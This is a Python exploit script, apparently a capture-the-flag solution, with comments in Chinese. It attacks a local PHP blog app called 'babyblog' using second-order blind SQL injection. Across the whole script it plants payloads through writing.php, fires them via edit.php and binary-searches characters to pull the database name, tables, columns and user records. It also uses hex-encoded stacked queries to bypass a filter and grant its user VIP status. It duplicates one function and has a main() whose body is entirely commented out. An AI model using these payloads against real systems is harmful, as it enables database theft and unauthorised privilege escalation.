import re
import requests
import binascii

url = "http://127.0.0.1:8302/"
cookie = "PHPSESSID=b4eed5285bb6440d799abc6a37feac4b"
username = "epicccal"

def http_get(url, payload):
    
    # writing.php , 将恶意 title 注入到数据库中
    result = requests.post(url + "writing.php", data={'title': "1'^(" + payload + ")^'1", 'content': 'wdnmd'}, headers={"Cookie": cookie})
    result.encoding = 'utf-8'

    # 获取到当前最新的帖子ID , 后面 UPDATE 时需要用到
    r2 = requests.get(url + "index.php", headers={"Cookie": cookie})
    pattern = re.compile(r'edit.php\?id=(\d+)')
    result1 = pattern.findall(r2.text)

    # edit.php , 若能更新成功则 UPDATE 语句中 where 后面条件为 1 , 不能修改成功则 where 后面条件为 0 
    result = requests.post(url + "edit.php", data={'title': "wdnmd", 'content': 'wdnmd', "id": result1[0]},headers={"Cookie": cookie})
    result.encoding = 'utf-8'

    # 检查是否修改成功( title 是否被修改 )
    result2 = requests.get(url + "edit.php?id=" + result1[0], headers={"Cookie": cookie})
    #print(result2.text.find('ascii') == -1)
    if result2.text.find('ascii') == -1:
        return True
    else:
        return False

# 二分法函数
def half(url, payload):
    low = 0
    high = 126
    # print(standard_html)
    while low <= high:
        mid = (low + high) / 2
        mid_num_payload = "%s > %d" % (payload, mid)
        if http_get(url, mid_num_payload):
            low = mid + 1
        else:
            high = mid - 1
    mid_num = int((low + high + 1) / 2)
    return mid_num

# 提升当前用户为 VIP 
def get_vip(url):
    # 堆叠注入 + 预处理语句 + Hex编码 绕过正则过滤
    string= 'update users set isvip=1 where username="' + username + '";'
    byte = bytes(string, encoding="utf8")
    byte1 = binascii.b2a_hex(byte)
    result = str(byte1, encoding="utf8")
    result = "0x" + result
    payload = "';set @t=" + result + ";prepare x from @t;execute x;"
    
    result = requests.post(url + "writing.php", data={'title': payload, 'content': 'wdnmd'}, headers={"Cookie": cookie})
    result.encoding = 'utf-8'

    # 执行 Payload
    r2 = requests.get(url + "index.php", headers={"Cookie": cookie})
    pattern = re.compile(r'edit.php\?id=(\d+)')
    result1 = pattern.findall(r2.text)
    result = requests.post(url + "edit.php", data={'title': "wdnmd", 'content': 'wdnmd', "id": result1[0]},headers={"Cookie": cookie})
    result.encoding = 'utf-8'
    print("重新输出用户信息 --- ")
    get_inf(url)

# 二分法函数
def half(url, payload):
    low = 0
    high = 126
    # print(standard_html)
    while low <= high:
        mid = (low + high) / 2
        mid_num_payload = "%s > %d" % (payload, mid)
        if http_get(url, mid_num_payload):
            low = mid + 1
        else:
            high = mid - 1
    mid_num = int((low + high + 1) / 2)
    return mid_num

# 获取 user表 中所有的信息
def get_inf(url):
    inf_name = ""
    db_sql = "select(group_concat(id,0x3a,username,0x3a,isvip)) from (babyblog.users)";
    for y in range(1,16):
        inf_name_payload = "ascii(substr((" + db_sql + "),%d,1))" % (y)
        inf_name += chr(half(url,inf_name_payload))
        print(inf_name)
    print("user 表中的信息为 : %s" % inf_name) 

# 获取user表中的所有字段
def get_columns(url):
    column_name = ""
    db_sql = "select(group_concat(column_name)) from information_schema.columns where table_name = 'users' and table_schema = 'babyblog'";
    for y in range(1,32):
        column_name_payload = "ascii(substr((" + db_sql + "),%d,1))" % (y)
        column_name += chr(half(url,column_name_payload))
        print(column_name)
    print("user 表中的字段有 : %s" % column_name) 

# 获取数据库中的所有表
def get_tables(url):
    tb_name = ""
    db_sql = "select(group_concat(table_name)) from information_schema.tables where table_schema = 'babyblog'"
    for y in range(1,16):
        tb_name_payload = "ascii(substr((" + db_sql + "),%d,1))" % (y)
        tb_name += chr(half(url, tb_name_payload))
        print(tb_name)
    print("当前数据库中的表有：%s" % tb_name)

# 获取数据库
def get_database(url):
    db_name = ""
    db_sql = "select database()"
    for y in range(1, 16):
        db_name_payload = "ascii(substr((" + db_sql + "),%d,1))" % (y)
        db_name += chr(half(url, db_name_payload))
        print(db_name)
    print("当前数据库名为：%s" % db_name)

# 获取当前数据库版本
def get_version(url):
    db_version = "";
    db_sql = "select version()";
    for y in range(1,16):
        db_version_payload = "ascii(substr((" + db_sql + "),%d,1))" % (y)
        db_version += chr(half(url,db_version_payload))
        print(db_version)
    print("版本为 : %s" % (db_version))

def main():
    #get_version(url)
    #get_database(url)
    #get_tables(url)
    #get_columns(url)
    #get_inf(url)    
    #get_vip(url)     

if __name__ == '__main__':
    main()
